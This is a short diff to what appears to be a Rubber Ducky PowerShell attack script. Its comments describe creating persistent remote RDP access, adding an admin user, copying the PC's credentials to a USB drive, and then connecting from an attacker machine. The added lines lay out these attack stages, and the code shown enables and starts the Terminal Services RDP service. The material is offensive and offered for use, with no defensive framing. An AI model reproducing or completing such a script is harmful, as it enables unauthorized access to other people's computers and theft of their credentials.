@@ -3,6 +3,9 @@
 
 # REM  create constent remote rdp , create a user with admin rights and send the data of the pc with user creds  to a usb 
 # mass storage device that is connected
+# stage 1 - insert diffrent usb mass storage device.
+# stage 2 - run the ducky script with the rubeer ducky and get the cred's in the sepreted usb that was inserted
+# stage 3 - connect from an attacker machine with an rdp program with the right pc cred's
 
 Set-Service -Name TermService -StartupType Automatic
 Start-Service TermService
